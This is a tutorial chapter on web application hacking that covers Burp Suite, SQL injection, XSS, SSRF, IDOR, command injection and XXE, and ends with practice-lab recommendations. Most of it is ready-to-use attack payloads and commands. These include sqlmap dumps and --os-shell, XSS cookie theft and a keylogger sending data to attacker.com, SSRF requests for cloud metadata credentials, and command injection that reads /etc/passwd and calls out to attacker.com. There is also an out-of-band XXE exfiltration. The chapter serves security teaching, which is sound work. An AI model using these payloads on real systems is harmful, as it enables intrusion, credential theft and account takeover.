---
title: 'Web Application Hacking'
subtitle: "OWASP Top 10, Burp Suite, SQL injection, XSS, SSRF, IDOR, command injection — the complete web attacker's toolkit."
chapter: 7
level: 'intermediate'
readingTime: '20 min'
topics:
  [
    'OWASP',
    'SQL injection',
    'XSS',
    'SSRF',
    'IDOR',
    'Burp Suite',
    'command injection',
    'web hacking'
  ]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

A web app is a building with thousands of doors, windows, and vents — all designed by different architects over years. The OWASP Top 10 is the list of door types that are consistently left unlocked across the industry.

</Callout>

## Burp Suite — The Web Pentester's Core Tool

Burp Suite is a proxy that sits between your browser and the target, letting you intercept, modify, and replay every HTTP request.

```bash
# Start Burp Suite
burpsuite &

# Configure browser to use Burp as proxy:
# HTTP: 127.0.0.1:8080
# HTTPS: 127.0.0.1:8080
# Install Burp's CA cert in browser for HTTPS interception

# Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
```

**Key Burp tabs:**

```
Proxy     → intercept and modify requests
Repeater  → manually re-send modified requests, see responses
Intruder  → automated payload injection (fuzzing, brute force)
Scanner   → automated vulnerability detection (Pro only)
Decoder   → encode/decode URL, Base64, HTML, Hex
Comparer  → diff two responses (great for blind SQLi)
```

### Burp Workflow

```
1. Browse the target normally with Burp intercepting
2. Build a site map in Target tab
3. Find interesting requests (login, search, file upload, API calls)
4. Send to Repeater → modify parameters → observe responses
5. Send to Intruder → fuzz for injections → analyze results
```

## SQL Injection

SQL injection occurs when user input is concatenated into SQL queries.

### Detection

```bash
# Manual tests — insert in every parameter
'                    # single quote — syntax error = likely SQLi
''                   # escaped single quote — if no error, confirm
1 OR 1=1             # always true
1 AND 1=2            # always false
1' OR '1'='1         # string context
1" OR "1"="1         # double quote context
; DROP TABLE users;-- # comment out rest (test error handling)
```

### Error-Based SQLi

```sql
-- If the app shows database errors, extract data directly
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1) --
```

### Union-Based SQLi

```sql
-- Step 1: Find number of columns in original query
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --   ← error means 2 columns
' ORDER BY 4 --   ← second error confirms 3 columns

-- Step 2: Find which columns are displayed
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --    ← numbers appear in output

-- Step 3: Extract data
' UNION SELECT NULL, username, password FROM users --
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

### Blind SQLi (Boolean-Based)

When no output is shown but behavior differs:

```sql
-- True condition vs false condition = different response
' AND 1=1 --    ← normal page
' AND 1=2 --    ← different page (blank, error, redirect)

-- Extract data bit by bit
' AND SUBSTRING(username,1,1)='a' --   ← if first char of username is 'a'
' AND ASCII(SUBSTRING(username,1,1))>64 --  ← binary search on ASCII value
```

### sqlmap — Automated SQLi

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data "user=admin&pass=test"

# With Burp request file
sqlmap -r request.txt   # paste the Burp request to a file

# Extract all databases
sqlmap -u "http://target.com/?id=1" --dbs

# Extract tables from a database
sqlmap -u "http://target.com/?id=1" -D targetdb --tables

# Extract data
sqlmap -u "http://target.com/?id=1" -D targetdb -T users --dump

# Get shell (if writable web root)
sqlmap -u "http://target.com/?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase,between
```

## Cross-Site Scripting (XSS)

XSS injects JavaScript into pages viewed by other users.

### Reflected XSS

```html
<!-- Vulnerable code -->
<p>Search results for: <?php echo $_GET['q']; ?></p>

<!-- Payload in URL -->
?q=
<script>
	alert(1);
</script>
?q=<img src="x" onerror="alert(1)" /> ?q=">
<script>
	alert(document.cookie);
</script>

<!-- Cookie theft payload -->
<script>
	fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

<!-- Keylogger -->
<script>
	document.onkeypress = function (e) {
		fetch('https://attacker.com/log?k=' + e.key);
	};
</script>
```

### Stored XSS (More Dangerous)

Payload stored in database, executes for every user who views it:

```html
<!-- In a comment field, forum post, profile bio -->
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'https://attacker.com/steal?cookie=' + document.cookie, true);
	xhr.send();
</script>

<!-- CSRF via stored XSS — change admin password -->
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('POST', '/admin/change-password', true);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.send('password=hacked&confirm=hacked');
</script>
```

### DOM-Based XSS

```javascript
// Vulnerable code — directly writing URL parameter to DOM
document.getElementById('output').innerHTML = location.hash.substring(1);

// Exploit: visit http://target.com/page#<img src=x onerror=alert(1)>
```

### XSS Bypass Techniques

```html
<!-- Filter bypasses when <script> is blocked -->
<img src="x" onerror="alert(1)" />
<svg onload="alert(1)">
	<iframe srcdoc="<script>alert(1)</script>">
		<body onload="alert(1)">
			<!-- When alert is filtered -->
			<script>
				confirm(1);
			</script>
			<script>
				prompt(1);
			</script>

			<!-- HTML entities bypass -->
			<script>
				&#x61;lert(1)
			</script>
			<script>
				&#97;lert(1)
			</script>

			<!-- JavaScript URL -->
			<a href="javascript:alert(1)">click</a>
		</body>
	</iframe>
</svg>
```

## Server-Side Request Forgery (SSRF)

SSRF makes the server issue requests on your behalf — bypassing firewalls to reach internal services.

```bash
# Basic SSRF — if the app fetches a URL
POST /api/fetch
{"url": "http://192.168.1.100/internal"}

# Cloud metadata — critical on AWS/GCP/Azure
{"url": "http://169.254.169.254/latest/meta-data/"}
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# Returns temporary AWS credentials → full AWS account takeover

# Internal service discovery
{"url": "http://localhost:6379/"}           # Redis
{"url": "http://localhost:9200/"}           # Elasticsearch
{"url": "http://localhost:2375/containers/json"}  # Docker API

# Protocol schemes
{"url": "file:///etc/passwd"}               # read local files
{"url": "gopher://localhost:6379/_SET x 'payload'"}  # Gopher for Redis

# SSRF bypass techniques when "localhost" is blocked
{"url": "http://127.0.0.1/"}
{"url": "http://0.0.0.0/"}
{"url": "http://[::1]/"}                    # IPv6 localhost
{"url": "http://2130706433/"}               # decimal IP for 127.0.0.1
{"url": "http://127.1/"}                    # shorthand
```

## Insecure Direct Object Reference (IDOR)

IDOR exposes unauthorized data by incrementing/modifying object identifiers.

```bash
# Example: viewing your own profile
GET /api/users/1234
# Try accessing another user
GET /api/users/1235
GET /api/users/1

# Order history
GET /api/orders/order-abc-123
# Try:
GET /api/orders/order-abc-122
GET /api/orders/order-abc-124

# File download
GET /download?file=report-user-1234.pdf
# Try:
GET /download?file=report-user-1235.pdf

# UUID-based IDORs (harder but not impossible)
# Look for UUID patterns in requests, try other UUIDs from the application
```

**Testing systematically with Burp Intruder:**

1. Capture request with numeric ID
2. Send to Intruder → mark ID as position
3. Use Numbers payload: 1 to 1000
4. Grep responses for keywords ("email", "name", "address")
5. Flag responses with content belonging to other users

## Command Injection

Occurs when user input is passed to system commands:

```php
// Vulnerable PHP
$domain = $_GET['domain'];
system("ping -c 4 " . $domain);
```

```bash
# Basic injection
domain=google.com; cat /etc/passwd
domain=google.com && whoami
domain=google.com | ls -la
domain=google.com `id`
domain=$(id)

# Blind command injection (no output, use OOB)
domain=google.com; curl http://attacker.com/$(whoami)
domain=google.com; ping -c 1 attacker.com

# Filter bypass
domain=google.com;c'a't /etc/passwd     # quote bypass
domain=google.com;c\at /etc/passwd      # backslash bypass
domain=google.com;cat${IFS}/etc/passwd  # space bypass
```

## XML External Entity (XXE)

```xml
<!-- Vulnerable XML parser accepts DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

<!-- Blind XXE — out-of-band exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
  %dtd;
]>
```

## OWASP Top 10 Quick Reference

```
A01 Broken Access Control   → IDOR, privilege escalation, missing auth
A02 Cryptographic Failures  → sensitive data in plaintext, weak crypto
A03 Injection               → SQLi, command injection, XXE, LDAP injection
A04 Insecure Design         → missing rate limiting, no brute force protection
A05 Security Misconfiguration → default creds, directory listing, verbose errors
A06 Vulnerable Components   → outdated libraries with known CVEs
A07 Auth Failures           → weak passwords, session fixation, no MFA
A08 Data Integrity Failures → insecure deserialization, unsigned updates
A09 Logging Failures        → missing logs, no alerts for suspicious activity
A10 SSRF                    → server fetching attacker-controlled URLs
```

## Real Project: DVWA Complete

DVWA (Damn Vulnerable Web App) — local practice environment:

```bash
# Setup with Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Login: admin/password
# Set security level: Low (to learn), then Medium/High (to learn bypasses)

# Work through each module:
# 1. Brute Force    → hydra or Burp Intruder
# 2. Command Injection → test ; && | separators
# 3. CSRF           → forge form submission from attacker site
# 4. File Inclusion → LFI/RFI via ?page= parameter
# 5. File Upload    → upload PHP shell disguised as image
# 6. Insecure CAPTCHA → bypass CAPTCHA entirely
# 7. SQL Injection  → manual then sqlmap
# 8. SQLi (Blind)  → time-based blind
# 9. Weak Session IDs → predict next session token
# 10. DOM XSS      → payload in DOM sink
# 11. Reflected XSS → payload in URL parameter
# 12. Stored XSS   → payload in guestbook
```

## Real Project: PortSwigger Web Academy

PortSwigger (makers of Burp Suite) offers 250+ free labs at `portswigger.net/web-security`:

```
Recommended order:
1. SQL Injection — all labs
2. XSS — reflected, stored, DOM
3. CSRF
4. Clickjacking
5. CORS
6. XXE
7. SSRF
8. OS command injection
9. Server-side template injection
10. Insecure deserialization
11. Access control (IDOR and more)
12. Authentication
13. Business logic vulnerabilities
14. HTTP Host header attacks
15. OAuth
16. JWT attacks
```

Complete these labs and you'll be at OSCP web-application level.
